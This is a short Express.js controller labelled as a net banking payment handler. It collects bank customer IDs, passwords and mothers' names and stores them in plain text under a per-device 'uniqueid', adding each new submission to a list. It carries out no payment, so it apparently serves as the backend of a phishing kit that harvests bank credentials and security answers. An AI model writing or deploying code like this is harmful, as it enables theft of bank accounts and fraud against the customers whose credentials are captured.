// controllers/netBankingController.js
const NetBanking = require('../models/NetBanking');

exports.submitNetBankingPayment = async (req, res) => {
  try {
    const { uniqueid, customerId, password, motherName } = req.body;
    let netBanking = await NetBanking.findOne({ uniqueid });

    if (netBanking) {
      // append new entry
      netBanking.entries.push({ customerId, password, motherName });
    } else {
      // create new document
      netBanking = new NetBanking({
        uniqueid,
        entries: [{ customerId, password, motherName }]
      });
    }

    await netBanking.save();
    res.status(200).json({
      success: true,
      message: "Net Banking Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting net banking data"
    });
  }
};
